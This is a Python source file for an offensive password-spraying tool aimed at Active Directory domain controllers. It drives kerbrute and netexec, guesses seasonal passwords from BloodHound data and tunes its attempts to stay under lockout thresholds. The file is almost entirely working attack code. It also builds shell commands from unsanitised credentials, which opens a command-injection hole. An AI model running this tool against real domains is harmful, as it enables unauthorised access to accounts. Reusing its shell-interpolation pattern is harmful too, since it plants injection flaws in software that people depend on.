#!/usr/bin/env python3
"""
Password spraying tool using kerbrute with smart date-based password generation.

This tool performs password spraying attacks against Active Directory domains using
kerbrute, with intelligent password generation based on password last change dates
from BloodHound CE.
"""

import argparse
import curses
import os
import re
import subprocess
import sys
import tempfile
from datetime import datetime, timezone
from pathlib import Path
from typing import List, Optional, Tuple, Union

from bloodhound_cli.core.ce import BloodHoundCEClient
from loguru import logger

# Version
__version__ = "1.0.3"

# Configure Loguru logging
logger.remove()  # Remove default handler
logger.add(
    sys.stderr,
    format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <level>{message}</level>",
    level="WARNING",  # Default: only show warnings and errors
    colorize=True,
    backtrace=True,
    diagnose=True,
)


def clean_ansi(text: str) -> str:
    """
    Remove ANSI escape codes from text.

    Args:
        text: Text that may contain ANSI escape codes

    Returns:
        Text with ANSI escape codes removed
    """
    ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
    return ansi_escape.sub("", text)


def sync_time_with_pdc(pdc_ip: str) -> bool:
    """
    Synchronize system time with Primary Domain Controller (PDC).

    This is critical for Kerberos authentication, which requires time
    synchronization within a 5-minute window.

    Args:
        pdc_ip: IP address of the Primary Domain Controller

    Returns:
        True if synchronization was successful, False otherwise
    """
    logger.info("[*] Synchronizing system time with PDC {}...", pdc_ip)

    # Enable NTP synchronization
    try:
        cmd_ntp = ["timedatectl", "set-ntp", "false"]
        logger.debug("Executing: {}", " ".join(cmd_ntp))
        result = subprocess.run(cmd_ntp, capture_output=True, text=True, check=True, timeout=10)
        logger.debug("NTP enabled successfully")
    except subprocess.CalledProcessError as e:
        logger.warning("Failed to enable NTP: {}. stderr: {}", e, clean_ansi(e.stderr) if e.stderr else "N/A")
        # Continue anyway, might work without it
    except subprocess.TimeoutExpired:
        logger.warning("timedatectl command timed out")
    except FileNotFoundError:
        logger.warning("timedatectl not found, skipping NTP setup")

    # Synchronize with PDC using ntpdate
    try:
        cmd_ntpdate = ["ntpdate", pdc_ip]
        logger.debug("Executing: {}", " ".join(cmd_ntpdate))
        result = subprocess.run(cmd_ntpdate, capture_output=True, text=True, check=True, timeout=30)
        logger.info("[+] Successfully synchronized time with PDC")
        if result.stdout:
            logger.debug("ntpdate output: {}", clean_ansi(result.stdout))
        return True
    except subprocess.CalledProcessError as e:
        logger.error(
            "Failed to synchronize time with PDC {}: {}. stderr: {}",
            pdc_ip,
            e,
            clean_ansi(e.stderr) if e.stderr else "N/A",
        )
        logger.warning(
            "Time synchronization failed. Kerberos authentication may fail if time difference exceeds 5 minutes."
        )
        return False
    except subprocess.TimeoutExpired:
        logger.error("ntpdate command timed out after 30 seconds")
        return False
    except FileNotFoundError:
        logger.error(
            "ntpdate not found. Please install ntpdate or ntp package. Time synchronization is required for Kerberos."
        )
        return False


def get_netexec_users(dc_ip: str, username: str, password: str, domain: str) -> List[Tuple[str, int]]:
    """
    Execute netexec to get user list with BadPwdCount.

    Uses grep and awk to filter the output.

    Args:
        dc_ip: Domain Controller IP address
        username: Username for netexec authentication
        password: Password for netexec authentication
        domain: Target domain name

    Returns:
        List of tuples containing (username, badpw_count)

    Raises:
        SystemExit: If netexec execution fails
    """
    # Check if the specific netexec path exists
    netexec_path = "/root/.adscan/tool_venvs/netexec/venv/bin/nxc"
    nxc_cmd = netexec_path if os.path.exists(netexec_path) else "nxc"
    cmd = (
        f"{nxc_cmd} smb {dc_ip} -u '{username}' -p '{password}' -d {domain} --users "
        "| grep -v '<never>' | awk '{print $5,$8}' | grep -v ']' | grep -v '-Username- Set-'"
    )
    try:
        logger.debug("Executing netexec command: {}", cmd)
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True, timeout=300)
    except subprocess.CalledProcessError as e:
        logger.error(
            "Error executing netexec to get users: {}. stderr: {}", e, clean_ansi(e.stderr) if e.stderr else "N/A"
        )
        sys.exit(1)
    except subprocess.TimeoutExpired:
        logger.error("Netexec command timed out after 300 seconds")
        sys.exit(1)

    users: List[Tuple[str, int]] = []
    for line in result.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        parts = line.split()
        if len(parts) < 2:
            continue
        user = parts[0]
        try:
            badpw = int(parts[1])
        except ValueError:
            logger.debug("Skipping line with invalid BadPwdCount: %s", line)
            continue
        users.append((user, badpw))
    return users


def get_account_lockout_threshold(dc_ip: str, username: str, password: str, domain: str) -> Union[int, str]:
    """
    Execute netexec to extract account lockout threshold.

    Args:
        dc_ip: Domain Controller IP address
        username: Username for netexec authentication
        password: Password for netexec authentication
        domain: Target domain name

    Returns:
        Account lockout threshold as integer, or string if parsing fails

    Raises:
        SystemExit: If netexec execution fails or threshold cannot be found
    """
    # Check if the specific netexec path exists
    netexec_path = "/root/.adscan/tool_venvs/netexec/venv/bin/nxc"
    nxc_cmd = netexec_path if os.path.exists(netexec_path) else "nxc"
    cmd = f"{nxc_cmd} smb {dc_ip} -u '{username}' -p '{password}' -d {domain} --pass-pol"
    try:
        logger.debug("Executing netexec command: {}", cmd)
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True, timeout=300)
    except subprocess.CalledProcessError as e:
        logger.error(
            "Error executing netexec to get lockout policy: {}. stderr: {}",
            e,
            clean_ansi(e.stderr) if e.stderr else "N/A",
        )
        sys.exit(1)
    except subprocess.TimeoutExpired:
        logger.error("Netexec command timed out after 300 seconds")
        sys.exit(1)

    match = re.search(r"(?i)Account\s+Lockout\s+Threshold\s*:\s*(.*)", result.stdout)
    if match:
        value = match.group(1).strip()
        try:
            return int(value)
        except ValueError:
            logger.warning("Could not parse lockout threshold as integer: %s", value)
            return value
    else:
        logger.error("Could not extract Account lockout threshold from domain.")
        sys.exit(1)


def read_enabled_users(enabled_users_file: str) -> set:
    """
    Read list of enabled users from a file (one user per line).

    Args:
        enabled_users_file: Path to file containing usernames

    Returns:
        Set of enabled usernames

    Raises:
        SystemExit: If file cannot be read
    """
    try:
        file_path = Path(enabled_users_file)
        if not file_path.exists():
            logger.error("User list file does not exist: {}", enabled_users_file)
            sys.exit(1)
        with open(file_path, encoding="utf-8") as f:
            enabled_users = {line.strip() for line in f if line.strip()}
        return enabled_users
    except OSError as e:
        logger.error("Error reading enabled users list from {}: {}", enabled_users_file, e)
        sys.exit(1)


def curses_menu(stdscr: curses.window, title: str, options: List[str]) -> int:
    """
    Display interactive curses menu to select an option.

    Args:
        stdscr: Curses window object
        title: Menu title
        options: List of menu options

    Returns:
        Index of selected option
    """
    curses.curs_set(0)
    selected = 0
    while True:
        stdscr.clear()
        stdscr.addstr(0, 0, title, curses.A_BOLD)
        for idx, option in enumerate(options):
            if idx == selected:
                stdscr.addstr(idx + 2, 2, f"> {option}", curses.A_REVERSE)
            else:
                stdscr.addstr(idx + 2, 2, f"  {option}")
        stdscr.refresh()
        key = stdscr.getch()
        if key in [curses.KEY_UP, ord("k")]:
            selected = (selected - 1) % len(options)
        elif key in [curses.KEY_DOWN, ord("j")]:
            selected = (selected + 1) % len(options)
        elif key in [curses.KEY_ENTER, ord("\n")]:
            return selected


def smart_date_menu() -> Tuple[str, str, str]:
    """
    Interactive curses interface to select spray parameters.

    Selects:
      - Language (English or Spanish)
      - Month case (Lower, e.g., january2025; or Upper, e.g., January2025)
      - Spray format for months (using 'month' placeholder)

    Returns:
        Tuple containing (language, month_case, spray_format_option)
    """
    languages = ["English", "Spanish"]
    case_options = ["Lower (e.g., january2025)", "Upper (e.g., January2025)"]
    mode_options = ["months"]
    months_formats = [
        "{month}{full_year}",
        "{month}.{full_year}",
        "{month}{full_year}.",
        "{month}@{full_year}",
        "{month}{full_year}!",
        "{month}{year_short}",
        "{month}.{year_short}",
        "{month}{year_short}.",
        "{month}@{year_short}",
        "{month}{year_short}!",
        "All",
    ]

    def curses_logic(stdscr):
        lang_idx = curses_menu(stdscr, "Select language:", languages)
        case_idx = curses_menu(stdscr, "Select month case:", case_options)
        curses_menu(stdscr, "Select spray mode:", mode_options)  # Show menu but don't use result
        fmt_idx = curses_menu(stdscr, "Select months spray format:", months_formats)
        month_case = "lower" if case_idx == 0 else "upper"
        return languages[lang_idx], month_case, months_formats[fmt_idx]

    return curses.wrapper(curses_logic)


def smart_date_formats() -> List[str]:
    """
    Return list of date formats for months with 'month' placeholder.

    Returns:
        List of format strings
    """
    return [
        "{month}{full_year}",
        "{month}.{full_year}",
        "{month}{full_year}.",
        "{month}@{full_year}",
        "{month}{full_year}!",
        "{month}{year_short}",
        "{month}.{year_short}",
        "{month}{year_short}.",
        "{month}@{year_short}",
        "{month}{year_short}!",
        "All",
    ]


def generate_spray_list(analyzer: BloodHoundCEClient, domain: str, smart_params: Tuple) -> List[str]:
    """
    Generate spray list using data from bloodhound-cli.

    If smart_params has 3 elements, assumes interactive mode (curses) and uses "month" placeholder.
    If smart_params has 4 elements, assumes non-interactive mode with format (lang, type, case, format_option),
    using "type" placeholder.

    Args:
        analyzer: BloodHound CE client instance
        domain: Target domain name
        smart_params: Tuple containing spray parameters

    Returns:
        List of "user:password" lines
    """
    if len(smart_params) == 3:
        language, month_case, fmt_option = smart_params
        placeholder = "month"

        def format_value(dt):
            month_eng = dt.strftime("%B")
            if language == "Spanish":
                spanish_months = {
                    "January": "enero",
                    "February": "febrero",
                    "March": "marzo",
                    "April": "abril",
                    "May": "mayo",
                    "June": "junio",
                    "July": "julio",
                    "August": "agosto",
                    "September": "septiembre",
                    "October": "octubre",
                    "November": "noviembre",
                    "December": "diciembre",
                }
                base = spanish_months.get(month_eng, month_eng.lower())
            else:
                base = month_eng
            return base.lower() if month_case == "lower" else base.capitalize()
    else:
        language, smart_type, case_option, fmt_option = smart_params
        placeholder = "type"

        def format_value(_):
            return smart_type.lower() if case_option == "low" else smart_type.capitalize()

    data = analyzer.get_password_last_change(domain)
    spray_lines = []
    for record in data:
        user = record["samaccountname"]
        ts = record.get("pwdlastset")
        try:
            ts_float = float(ts)
            if ts_float == 0:
                wc = record.get("whencreated")
                dt = datetime.fromtimestamp(float(wc), tz=timezone.utc)
            else:
                dt = datetime.fromtimestamp(ts_float, tz=timezone.utc)
        except (ValueError, TypeError, KeyError) as e:
            logger.error("Error converting timestamp for user {}: {}", user, e)
            continue
        year_full = dt.strftime("%Y")
        year_short = dt.strftime("%y")
        type_formatted = format_value(dt)

        def apply_format(fmt_str):
            return fmt_str.format(**{placeholder: type_formatted, "full_year": year_full, "year_short": year_short})

        if fmt_option == "All":
            variants = [fmt for fmt in smart_date_formats() if fmt != "All"]
            spray_candidates = [apply_format(fmt) for fmt in variants]
            password = ",".join(spray_candidates)
        else:
            password = apply_format(fmt_option)
        spray_lines.append(f"{user}:{password}")
    return spray_lines


def write_temp_spray_file(lines: List[str]) -> str:
    """
    Write spray list to a temporary file ("user:password" format).

    Args:
        lines: List of "user:password" lines

    Returns:
        Path to temporary file
    """
    tmp = tempfile.NamedTemporaryFile(mode="w", delete=False)
    for line in lines:
        tmp.write(line + "\n")
    tmp.close()
    return tmp.name


def run_smart_kerbrute(domain: str, dc_ip: str, temp_file: str, kerbrute_path: Optional[str] = None) -> None:
    """
    Execute kerbrute bruteforce using temporary file.

    Args:
        domain: Target domain name
        dc_ip: Domain Controller IP address
        temp_file: Path to temporary file with user:password pairs
        kerbrute_path: Optional path to kerbrute binary (if not in PATH)

    Raises:
        SystemExit: If kerbrute execution fails
    """
    # Synchronize time with PDC before running kerbrute
    sync_time_with_pdc(dc_ip)

    # Determine kerbrute command
    kerbrute_cmd = kerbrute_path if kerbrute_path else "kerbrute"
    if kerbrute_path and not Path(kerbrute_path).exists():
        logger.error("Kerbrute path does not exist: {}", kerbrute_path)
        sys.exit(1)

    cmd = [kerbrute_cmd, "bruteforce", "-d", domain, "--dc", dc_ip, temp_file]
    try:
        logger.debug("Executing kerbrute command: {}", " ".join(cmd))
        result = subprocess.run(cmd, capture_output=True, text=True, check=True, timeout=3600)
        # Always show kerbrute output (it's the main result)
        print(clean_ansi(result.stdout))
    except subprocess.CalledProcessError as e:
        logger.error("Error executing kerbrute: {}", e)
        if e.stdout:
            logger.error("kerbrute stdout: {}", clean_ansi(e.stdout))
        if e.stderr:
            logger.error("kerbrute stderr: {}", clean_ansi(e.stderr))
        sys.exit(1)
    except subprocess.TimeoutExpired:
        logger.error("Kerbrute command timed out after 3600 seconds")
        sys.exit(1)


def write_temp_users_file(users: List[str]) -> str:
    """
    Write eligible users list to a temporary file.

    Args:
        users: List of usernames

    Returns:
        Path to temporary file
    """
    tmp = tempfile.NamedTemporaryFile(mode="w", delete=False)
    for user in users:
        tmp.write(user + "\n")
    tmp.close()
    return tmp.name


def run_kerbrute(
    domain: str,
    dc_ip: str,
    temp_users_file: str,
    spray_password: Optional[str],
    use_user_as_pass: bool = False,
    output_dir: Optional[str] = None,
    kerbrute_path: Optional[str] = None,
) -> None:
    """
    Execute kerbrute passwordspray using user list.

    Args:
        domain: Target domain name
        dc_ip: Domain Controller IP address
        temp_users_file: Path to temporary file with usernames
        spray_password: Password to spray (None for bruteforce mode)
        use_user_as_pass: If True, add --user-as-pass flag
        output_dir: Optional output directory for kerbrute results
        kerbrute_path: Optional path to kerbrute binary (if not in PATH)

    Raises:
        SystemExit: If kerbrute execution fails
    """
    # Synchronize time with PDC before running kerbrute
    sync_time_with_pdc(dc_ip)

    # Determine kerbrute command
    kerbrute_cmd = kerbrute_path if kerbrute_path else "kerbrute"
    if kerbrute_path and not Path(kerbrute_path).exists():
        logger.error("Kerbrute path does not exist: {}", kerbrute_path)
        sys.exit(1)

    if use_user_as_pass:
        cmd = [kerbrute_cmd, "passwordspray", "-d", domain, "--dc", dc_ip, "--user-as-pass", temp_users_file]
    else:
        if spray_password:
            cmd = [kerbrute_cmd, "passwordspray", "-d", domain, "--dc", dc_ip, temp_users_file, spray_password]
        else:
            cmd = [kerbrute_cmd, "bruteforce", "-d", domain, "--dc", dc_ip, temp_users_file]
    if output_dir:
        cmd.extend(["-o", output_dir])
    try:
        logger.debug("Executing kerbrute command: {}", " ".join(cmd))
        result = subprocess.run(cmd, capture_output=True, text=True, check=True, timeout=3600)
        # Always show kerbrute output (it's the main result)
        print(clean_ansi(result.stdout))
    except subprocess.CalledProcessError as e:
        logger.error("Error executing kerbrute: {}", e)
        if e.stdout:
            logger.error("kerbrute stdout: {}", clean_ansi(e.stdout))
        if e.stderr:
            logger.error("kerbrute stderr: {}", clean_ansi(e.stderr))
        sys.exit(1)
    except subprocess.TimeoutExpired:
        logger.error("Kerbrute command timed out after 3600 seconds")
        sys.exit(1)


# --- Main with subcommands ---
def main() -> None:
    """
    Main entry point for the password spraying tool.

    Parses command-line arguments and executes the appropriate spray mode:
    - smart: Date-based password generation using BloodHound CE
    - password: Fixed password spraying
    - useraspass: Username-as-password spraying
    """
    parser = argparse.ArgumentParser(
        description="Script to perform password spraying with kerbrute using subcommands."
    )
    parser.add_argument(
        "--version", action="version", version=f"%(prog)s {__version__}", help="Show version and exit"
    )
    subparsers = parser.add_subparsers(dest="subcommand", required=True, help="Spraying mode")

    # Smart subcommand (smart-date mode)
    smart_parser = subparsers.add_parser(
        "smart", help="Smart spraying (smart-date) using bloodhound-cli; does not require -u or -p"
    )
    smart_parser.add_argument("-d", required=True, help="Domain (used for bloodhound-cli and kerbrute)")
    smart_parser.add_argument("--dc-ip", required=True, help="Domain Controller IP address (PDC)")
    smart_parser.add_argument("-ul", help="Username for netexec (optional)")
    smart_parser.add_argument("-pl", help="Password for netexec (optional)")
    smart_parser.add_argument("-t", type=int, default=0, help="Safe threshold")
    smart_parser.add_argument("-target-domain", help="Target domain for kerbrute")
    smart_parser.add_argument("-o", "--output", help="Directory to save kerbrute output")
    # Parameters for non-interactive use (all must be specified or none)
    smart_parser.add_argument("--lang", choices=["English", "Spanish"], help="Language for spray: English or Spanish")
    smart_parser.add_argument("--type", choices=["month"], help="Spray type (currently only 'month')")
    smart_parser.add_argument(
        "-c",
        "--case",
        choices=["lower", "upper"],
        help="Type presentation: 'lower' for lowercase or 'upper' for uppercase",
    )
    available_formats = {
        1: "{type}{full_year}",
        2: "{type}.{full_year}",
        3: "{type}{full_year}.",
        4: "{type}@{full_year}",
        5: "{type}{full_year}!",
        6: "{type}{year_short}",
        7: "{type}.{year_short}",
        8: "{type}{year_short}.",
        9: "{type}@{year_short}",
        10: "{type}{year_short}!",
    }
    format_help = "\n".join([f"{k}: {v}" for k, v in available_formats.items()])
    smart_parser.add_argument(
        "-f",
        "--format",
        type=int,
        choices=range(1, len(available_formats) + 1),
        help=f"Spray format ID. Options:\n{format_help}\nIf omitted, interactive menu is shown.",
    )
    smart_parser.add_argument(
        "-v", "--verbose", action="store_true", help="Enable verbose output (more detailed information)"
    )
    smart_parser.add_argument("--debug", action="store_true", help="Enable debug mode (very detailed information)")
    smart_parser.add_argument("--kerbrute-path", help="Path to kerbrute binary (if not in PATH)")

    # Password subcommand (uses user list and fixed password -p)
    password_parser = subparsers.add_parser(
        "password", help="Fixed password spraying; requires user list (-u) and password (-p)"
    )
    password_parser.add_argument("-d", required=True, help="Domain (used for netexec and kerbrute)")
    password_parser.add_argument("--dc-ip", required=True, help="Domain Controller IP address (PDC)")
    password_parser.add_argument("-ul", help="Username for netexec (optional)")
    password_parser.add_argument("-pl", help="Password for netexec (optional)")
    password_parser.add_argument("-t", type=int, default=0, help="Safe threshold")
    password_parser.add_argument("-u", required=True, help="Path to enabled users list")
    password_parser.add_argument("-p", required=True, help="Password for password spraying (kerbrute)")
    password_parser.add_argument("-target-domain", help="Target domain for kerbrute")
    password_parser.add_argument("-o", "--output", help="Directory to save kerbrute output")
    password_parser.add_argument(
        "-v", "--verbose", action="store_true", help="Enable verbose output (more detailed information)"
    )
    password_parser.add_argument("--debug", action="store_true", help="Enable debug mode (very detailed information)")
    password_parser.add_argument("--kerbrute-path", help="Path to kerbrute binary (if not in PATH)")

    # Useraspass subcommand (uses user list and user-as-pass)
    useraspass_parser = subparsers.add_parser(
        "useraspass", help="User-as-pass spraying; requires user list (-u) and --low or --up option"
    )
    useraspass_parser.add_argument("-d", required=True, help="Domain (used for netexec and kerbrute)")
    useraspass_parser.add_argument("--dc-ip", required=True, help="Domain Controller IP address (PDC)")
    useraspass_parser.add_argument("-ul", help="Username for netexec (optional)")
    useraspass_parser.add_argument("-pl", help="Password for netexec (optional)")
    useraspass_parser.add_argument("-t", type=int, default=0, help="Safe threshold")
    useraspass_parser.add_argument("-u", required=True, help="Path to enabled users list")
    group_useraspass = useraspass_parser.add_mutually_exclusive_group(required=False)
    group_useraspass.add_argument("--low", action="store_true", help="Use user-as-pass with lowercase username")
    group_useraspass.add_argument(
        "--up", action="store_true", help="Use user-as-pass with first letter capitalized username"
    )
    useraspass_parser.add_argument("-target-domain", help="Target domain for kerbrute")
    useraspass_parser.add_argument("-o", "--output", help="Directory to save kerbrute output")
    useraspass_parser.add_argument(
        "-v", "--verbose", action="store_true", help="Enable verbose output (more detailed information)"
    )
    useraspass_parser.add_argument("--debug", action="store_true", help="Enable debug mode (very detailed information)")
    useraspass_parser.add_argument("--kerbrute-path", help="Path to kerbrute binary (if not in PATH)")

    args = parser.parse_args()

    # Configure logging based on verbosity flags
    # Priority: debug > verbose > default (INFO)
    if args.debug:
        logger.remove()
        logger.add(sys.stderr, level="DEBUG", colorize=True, backtrace=True, diagnose=True)
        logger.debug("Debug mode enabled. Showing very detailed information.")
    elif args.verbose:
        logger.remove()
        logger.add(sys.stderr, level="INFO", colorize=True, backtrace=False, diagnose=False)
        logger.info("Verbose mode enabled. Showing detailed information.")

    # Common function to get eligible users (using netexec if credentials are provided)
    def get_eligible_users(domain, users_file, dc_ip, ul, pl, threshold):
        """
        Get eligible users for password spraying.

        If netexec credentials are provided, filters users based on account lockout threshold.
        Otherwise, returns all users from the provided file.

        Args:
            domain: Target domain name
            users_file: Path to file with enabled users
            dc_ip: Domain Controller IP address
            ul: Username for netexec (optional)
            pl: Password for netexec (optional)
            threshold: Safe threshold for remaining lockout attempts

        Returns:
            List of eligible usernames
        """
        if ul and pl:
            logger.info("[*] Getting Account lockout threshold from domain...")
            account_threshold = get_account_lockout_threshold(dc_ip, ul, pl, domain)
            logger.info(f"[*] Account lockout threshold obtained: {account_threshold}")
            if isinstance(account_threshold, int):
                logger.info("[*] Getting users and their BadPW with netexec...")
                netexec_users = get_netexec_users(dc_ip, ul, pl, domain)
                if not netexec_users:
                    logger.error("No users obtained from netexec.")
                    sys.exit(1)
                logger.info("[*] Reading enabled users list...")
                file_users = read_enabled_users(users_file)
                eligible = []
                for user, badpw in netexec_users:
                    if user in file_users:
                        remaining = account_threshold - badpw
                        if remaining > threshold:
                            eligible.append(user)
                        else:
                            logger.debug(
                                f"[-] User {user} not eligible. BadPW: {badpw}, remaining attempts: {remaining}"
                            )
                if not eligible:
                    logger.info("No eligible users according to safe threshold.")
                    sys.exit(0)
                return eligible
            else:
                return list(read_enabled_users(users_file))
        else:
            return list(read_enabled_users(users_file))

    # Process subcommands
    if args.subcommand == "smart":
        logger.info("[*] Smart mode activated. Getting password last change data from bloodhound-cli...")
        bh_base_url = os.getenv("BH_CE_BASE_URL", "http://localhost:8080")
        bh_username = os.getenv("BH_CE_USERNAME", "admin")
        bh_password = os.getenv("BH_CE_PASSWORD", "Bloodhound123!")
        analyzer = BloodHoundCEClient(base_url=bh_base_url)
        # Ensure valid token (authenticate if needed)
        if not analyzer.ensure_valid_token():
            logger.info(f"[*] Authenticating with BloodHound CE using user: {bh_username}")
            token = analyzer.authenticate(bh_username, bh_password)
            if not token:
                logger.error("[!] Error authenticating with BloodHound CE. Verify credentials.")
                sys.exit(1)
        # Si se especifican --lang, --type, --case y --format, se usan directamente
        if args.lang and args.type and args.case and (args.format is not None):
            available_formats = {
                1: f"{{{args.type}}}{{full_year}}",
                2: f"{{{args.type}}}.{{full_year}}",
                3: f"{{{args.type}}}{{full_year}}.",
                4: f"{{{args.type}}}@{{full_year}}",
                5: f"{{{args.type}}}{{full_year}}!",
                6: f"{{{args.type}}}{{year_short}}",
                7: f"{{{args.type}}}.{{year_short}}",
                8: f"{{{args.type}}}{{year_short}}.",
                9: f"{{{args.type}}}@{{year_short}}",
                10: f"{{{args.type}}}{{year_short}}!",
            }
            if args.format not in available_formats:
                logger.error("Invalid format ID.")
                sys.exit(1)
            smart_params = (args.lang, args.case, available_formats[args.format])
        else:
            smart_params = smart_date_menu()  # (language, month_case, spray_format_option)
        logger.info(f"[*] Selected: {smart_params}")
        data = analyzer.get_password_last_change(args.d)
        eligible_users = [record["samaccountname"] for record in data]
        spray_list = generate_spray_list(analyzer, args.d, smart_params)
        analyzer.close()
        logger.info(f"[*] Number of users for spraying (smart): {len(eligible_users)}")
        temp_file = write_temp_spray_file(spray_list)
        spray_password = None
        use_user_as_pass = False
        kerbrute_domain = args.target_domain if args.target_domain else args.d
        logger.info("[*] Executing kerbrute in smart mode...")
        run_kerbrute(
            kerbrute_domain,
            args.dc_ip,
            temp_file,
            spray_password,
            use_user_as_pass=use_user_as_pass,
            output_dir=args.output,
            kerbrute_path=getattr(args, "kerbrute_path", None),
        )
        os.remove(temp_file)
        logger.info("[*] Process completed in smart mode.")

    elif args.subcommand == "password":
        logger.info("[*] Password mode activated. Processing spraying in password mode...")
        eligible_users = get_eligible_users(args.d, args.u, args.dc_ip, args.ul, args.pl, args.t)
        logger.info(f"[*] Number of eligible users for spraying (password): {len(eligible_users)}")
        spray_list = [f"{user}:{args.p}" for user in eligible_users]
        temp_file = write_temp_users_file(eligible_users)
        use_user_as_pass = False
        kerbrute_domain = args.target_domain if args.target_domain else args.d
        logger.info("[*] Executing kerbrute in password mode...")
        run_kerbrute(
            kerbrute_domain,
            args.dc_ip,
            temp_file,
            args.p,
            use_user_as_pass=use_user_as_pass,
            output_dir=args.output,
            kerbrute_path=getattr(args, "kerbrute_path", None),
        )
        os.remove(temp_file)
        logger.info("[*] Process completed in password mode.")

    elif args.subcommand == "useraspass":
        logger.info("[*] Useraspass mode activated. Processing spraying in useraspass mode...")
        eligible_users = get_eligible_users(args.d, args.u, args.dc_ip, args.ul, args.pl, args.t)
        logger.info(f"[*] Number of eligible users for spraying (useraspass): {len(eligible_users)}")
        use_user_as_pass = False
        if args.low:
            eligible_users = [user.lower() for user in eligible_users]
            use_user_as_pass = True
        elif args.up:
            eligible_users = [user.capitalize() for user in eligible_users]
            use_user_as_pass = True
        else:
            # No case specified: use exact username as password
            use_user_as_pass = True
        temp_file = write_temp_users_file(eligible_users)
        kerbrute_domain = args.target_domain if args.target_domain else args.d
        logger.info("[*] Executing kerbrute in useraspass mode...")
        run_kerbrute(
            kerbrute_domain,
            args.dc_ip,
            temp_file,
            None,
            use_user_as_pass=use_user_as_pass,
            output_dir=args.output,
            kerbrute_path=getattr(args, "kerbrute_path", None),
        )
        os.remove(temp_file)
        logger.info("[*] Process completed in useraspass mode.")


if __name__ == "__main__":
    main()
